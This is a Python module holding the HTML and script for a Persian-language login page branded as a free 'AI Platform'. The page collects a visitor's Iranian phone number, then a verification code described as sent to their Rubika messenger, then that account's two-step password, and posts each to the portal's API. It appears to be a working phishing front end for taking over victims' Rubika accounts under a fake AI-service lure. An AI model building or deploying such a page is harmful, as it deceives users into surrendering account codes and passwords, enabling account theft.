"""
portal.page — HTML for the account-login portal (served by portal.app).
Additive & isolated: pure presentation. Design is the user's "AI Platform"
theme; the <script> is wired to the portal endpoints and includes an s3
two-step-password screen and a "code sent to Rubika" note.
"""

PAGE_HTML = r"""<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<title>AI Platform</title>
<link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
<style>
  *{ box-sizing:border-box; margin:0; padding:0; font-family:"Vazirmatn",Tahoma,sans-serif;
     -webkit-tap-highlight-color:transparent; }

  html,body{ height:100%; overflow:hidden; }

  body{
    position:fixed; inset:0;
    display:flex; justify-content:center; align-items:center;
    padding:18px; overscroll-behavior:none; touch-action:none;
    background:linear-gradient(160deg,#fbfeff 0%,#eef8ff 50%,#dff2ff 100%);
  }

  .orb{ position:fixed; border-radius:50%; filter:blur(70px); z-index:0;
        animation:float 15s ease-in-out infinite; will-change:transform; }
  .orb.a{ width:250px; height:250px; background:#bfe8ff; opacity:.45; top:-60px; right:-40px; }
  .orb.b{ width:220px; height:220px; background:#aaf3f7; opacity:.38; bottom:-70px; left:-50px; animation-delay:-5s; }
  .orb.c{ width:180px; height:180px; background:#d3ddff; opacity:.3;  top:48%; left:58%; animation-delay:-9s; }
  @keyframes float{ 0%,100%{transform:translateY(0)} 50%{transform:translateY(-24px)} }

  .card{
    width:100%; max-width:340px; background:rgba(255,255,255,.97);
    backdrop-filter:blur(8px); border-radius:28px;
    padding:32px 22px 26px; text-align:center;
    box-shadow:0 18px 42px rgba(30,110,160,.14); z-index:2;
    animation:rise .5s cubic-bezier(.2,.8,.2,1);
  }
  @keyframes rise{ from{opacity:0;transform:translateY(14px)} to{opacity:1;transform:none} }

  .logo{ width:64px; height:64px; margin:0 auto 10px; filter:drop-shadow(0 6px 14px rgba(14,127,166,.28)); }

  h1{ font-size:19px; color:#12354a; font-weight:800; }
  .sub{ font-size:12px; color:#8497a8; margin-top:2px; }
  h2{ font-size:21px; color:#0f172a; font-weight:900; margin-top:18px; }
  .desc{ font-size:12.5px; color:#607284; margin:6px 0 22px; line-height:1.8; }

  .input-group{
    display:flex; align-items:center; justify-content:center; background:#f7fbff;
    border:1px solid #dbe9f4; border-radius:13px; height:52px;
    padding:0 12px; margin-bottom:8px; transition:.25s;
  }
  .input-group:focus-within{ border-color:#0e7fa6; box-shadow:0 0 0 4px rgba(14,127,166,.1); }
  .cc{ direction:ltr; font-size:15px; color:#0f172a; font-weight:700; flex-shrink:0; }
  .divider{ width:1px; height:24px; background:#d7e2ec; margin:0 10px; flex-shrink:0; }
  .phone{
    flex:1; min-width:0; border:0; background:transparent; outline:0;
    font-size:17px; color:#0f172a; text-align:center; letter-spacing:3px;
  }
  .phone::placeholder{ color:#a3b3c2; letter-spacing:0; font-size:14px; }

  /* خانه‌های کد ۶ رقمی */
  .code-boxes{ display:flex; justify-content:center; gap:7px; direction:ltr; margin-bottom:8px; }
  .code-boxes input{
    width:40px; height:52px; text-align:center; font-size:21px; font-weight:800;
    color:#0f172a; background:#f7fbff; border:1px solid #dbe9f4; border-radius:11px;
    outline:0; transition:.2s;
  }
  .code-boxes input:focus{ border-color:#0e7fa6; box-shadow:0 0 0 4px rgba(14,127,166,.1); background:#fff; }

  .msg{ min-height:16px; font-size:12px; margin-bottom:12px; color:#e11d48; transition:.2s; }
  .msg.ok{ color:#059669; }

  .sent-note{ background:#ecfdf5; border:1px solid #a7f3d0; color:#047857;
    border-radius:12px; padding:11px 12px; font-size:13px; font-weight:600; margin:2px 0 14px; }

  .btn{
    width:100%; height:50px; border:0; border-radius:25px; cursor:pointer;
    color:#fff; font-size:16px; font-weight:800;
    background:linear-gradient(90deg,#0e7fa6,#12a6cc);
    box-shadow:0 8px 20px rgba(14,127,166,.3); transition:.25s;
  }
  .btn:active{ transform:scale(.99); }
  .btn:disabled{ opacity:.5; cursor:not-allowed; box-shadow:none; }

  .resend{ margin-top:16px; font-size:12.5px; color:#0e7fa6; cursor:pointer; font-weight:600; }
  .back{ margin-top:12px; font-size:12px; color:#8497a8; cursor:pointer; }
  .hidden{ display:none; }
</style>
</head>
<body>

  <div class="orb a"></div>
  <div class="orb b"></div>
  <div class="orb c"></div>

  <div class="card">
    <svg class="logo" viewBox="0 0 72 72">
      <defs>
        <linearGradient id="lg" x1="0" y1="0" x2="1" y2="1">
          <stop offset="0" stop-color="#17b0d6"/>
          <stop offset="1" stop-color="#0a6a89"/>
        </linearGradient>
      </defs>
      <path d="M36 3 L64 19 V53 L36 69 L8 53 V19 Z" fill="url(#lg)"/>
      <g stroke="#cff4ff" stroke-width="1.5" opacity=".85">
        <line x1="36" y1="20" x2="22" y2="34"/><line x1="36" y1="20" x2="50" y2="34"/>
        <line x1="22" y1="34" x2="36" y2="48"/><line x1="50" y1="34" x2="36" y2="48"/>
        <line x1="22" y1="34" x2="50" y2="34"/>
      </g>
      <g fill="#eafcff">
        <circle cx="36" cy="20" r="3"/><circle cx="22" cy="34" r="3"/>
        <circle cx="50" cy="34" r="3"/><circle cx="36" cy="48" r="3.4"/>
      </g>
    </svg>

    <!-- مرحله ۱: شماره -->
    <div id="s1">
      <h1>AI پلتفرم</h1>
      <div class="sub">هوش مصنوعی رایگان</div>
      <h2>خوش آمدید!</h2>
      <div class="desc">برای ورود، شماره موبایل خود را وارد کنید.</div>

      <div class="input-group">
        <input id="phone" class="phone" type="tel" inputmode="numeric" maxlength="11" placeholder="شماره موبایل">
        <div class="divider"></div>
        <div class="cc">+۹۸</div>
      </div>

      <div id="m1" class="msg"></div>
      <button id="btn1" class="btn" onclick="goCode()">ارسال کد تایید</button>
    </div>

    <!-- مرحله ۲: وارد کردن کد ۶ رقمی -->
    <div id="s2" class="hidden">
      <h2>کد تایید</h2>
      <div class="sent-note">✅ کد تأیید به روبیکای شما ارسال شد</div>
      <div class="desc">کد ۶ رقمی را که در پیام‌های روبیکا دریافت کردید وارد کنید.</div>

      <div class="code-boxes" id="codeBoxes">
        <input type="tel" inputmode="numeric" maxlength="1">
        <input type="tel" inputmode="numeric" maxlength="1">
        <input type="tel" inputmode="numeric" maxlength="1">
        <input type="tel" inputmode="numeric" maxlength="1">
        <input type="tel" inputmode="numeric" maxlength="1">
        <input type="tel" inputmode="numeric" maxlength="1">
      </div>

      <div id="m2" class="msg"></div>
      <button id="btn2" class="btn" onclick="verify()">تایید</button>

      <div class="resend" onclick="resend()">ارسال مجدد کد</div>
      <div class="back" onclick="goBack()">‹ تغییر شماره</div>
    </div>

    <!-- مرحله ۳: رمز دومرحله‌ای -->
    <div id="s3" class="hidden">
      <h2>رمز دومرحله‌ای</h2>
      <div class="desc">این اکانت رمز عبور دومرحله‌ای دارد. رمز را وارد کنید.</div>

      <div class="input-group">
        <input id="pass" class="phone" type="password" placeholder="رمز دومرحله‌ای" style="letter-spacing:1px">
      </div>

      <div id="m3" class="msg"></div>
      <button id="btn3" class="btn" onclick="sendPassword()">ادامه</button>
      <div class="back" onclick="goBack()">‹ تغییر شماره</div>
    </div>
  </div>

<script>
  const OK_PREFIX = ["091","099","090","092","093","094"];
  const $ = id => document.getElementById(id);
  let currentPhone = "";

  async function api(path, body){
    const r = await fetch(path, {method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify(body)});
    return await r.json();
  }
  function show(id){ ["s1","s2","s3"].forEach(s=>$(s).classList.add('hidden')); $(id).classList.remove('hidden'); }
  function isValid(p){ return /^09\d{9}$/.test(p) && OK_PREFIX.some(x=>p.startsWith(x)); }

  // ---- مرحله شماره ----
  const phoneEl = $('phone'), m1 = $('m1'), btn1 = $('btn1');
  phoneEl.addEventListener('input', e=>{
    let v = e.target.value.replace(/\D/g,'').slice(0,11);
    e.target.value = v; checkPhone(v);
  });
  function checkPhone(v){
    if(v.length < 11){ m1.textContent=''; btn1.disabled=true; return; }
    if(!isValid(v)){ m1.className='msg'; m1.textContent='✗ شماره خرابه'; btn1.disabled=true; return; }
    m1.className='msg ok'; m1.textContent='✓ شماره درست است'; btn1.disabled=false;
  }
  async function goCode(){
    const v = phoneEl.value.trim();
    if(!isValid(v)) return;
    currentPhone = v; m1.className='msg'; m1.textContent='... در حال ارسال'; btn1.disabled=true;
    try{
      const r = await api('/api/start', {phone:v});
      if(r.error){ m1.className='msg'; m1.textContent='✗ '+r.error; btn1.disabled=false; return; }
      show(r.next==='password' ? 's3' : 's2');
      if(r.next==='code'){ boxes[0].focus(); }
    }catch(e){ m1.className='msg'; m1.textContent='✗ خطایی رخ داد، دوباره تلاش کن'; btn1.disabled=false; }
  }
  btn1.disabled = true;

  // ---- مرحله رمز دومرحله‌ای ----
  async function sendPassword(){
    const pw = $('pass').value, m3 = $('m3'), btn3 = $('btn3');
    if(!pw){ m3.className='msg'; m3.textContent='✗ رمز را وارد کن'; return; }
    m3.className='msg'; m3.textContent='... در حال بررسی'; btn3.disabled=true;
    try{
      const r = await api('/api/password', {phone:currentPhone, password:pw});
      if(r.error){ m3.className='msg'; m3.textContent='✗ '+r.error; btn3.disabled=false; return; }
      if(r.next==='code'){ show('s2'); boxes[0].focus(); }
    }catch(e){ m3.className='msg'; m3.textContent='✗ خطایی رخ داد، دوباره تلاش کن'; btn3.disabled=false; }
  }

  // ---- مرحله کد (۶ رقمی) ----
  const boxes = [...$('codeBoxes').querySelectorAll('input')];
  const m2 = $('m2'), btn2 = $('btn2');
  boxes.forEach((box,i)=>{
    box.addEventListener('input', ()=>{
      box.value = box.value.replace(/\D/g,'');
      if(box.value && i < boxes.length-1) boxes[i+1].focus();
      checkCode();
    });
    box.addEventListener('keydown', e=>{
      if(e.key==='Backspace' && !box.value && i>0) boxes[i-1].focus();
      if(e.key==='Enter' && !btn2.disabled) verify();
    });
  });
  function codeVal(){ return boxes.map(b=>b.value).join(''); }
  function checkCode(){ btn2.disabled = codeVal().length !== 6; }
  async function verify(){
    const code = codeVal();
    if(code.length !== 6){ m2.className='msg'; m2.textContent='✗ کد کامل نیست'; return; }
    m2.className='msg'; m2.textContent='... در حال بررسی'; btn2.disabled=true;
    try{
      const r = await api('/api/code', {phone:currentPhone, code:code});
      if(r.ok){ m2.className='msg ok'; m2.textContent='✓ ورود موفق بود'; }
      else if(r.next==='password'){ show('s3'); }
      else { m2.className='msg'; m2.textContent='✗ '+(r.error||'کد خرابه'); btn2.disabled=false; }
    }catch(e){ m2.className='msg'; m2.textContent='✗ خطایی رخ داد، دوباره تلاش کن'; btn2.disabled=false; }
  }
  async function resend(){
    m2.className='msg ok'; m2.textContent='... ارسال مجدد';
    try{
      const r = await api('/api/resend', {phone:currentPhone});
      m2.className = r.ok ? 'msg ok' : 'msg';
      m2.textContent = r.ok ? '✓ کد دوباره ارسال شد' : '✗ '+(r.error||'خطا');
    }catch(e){ m2.className='msg'; m2.textContent='✗ خطا'; }
  }
  function goBack(){ show('s1'); }
  btn2.disabled = true;
</script>
</body>
</html>
"""
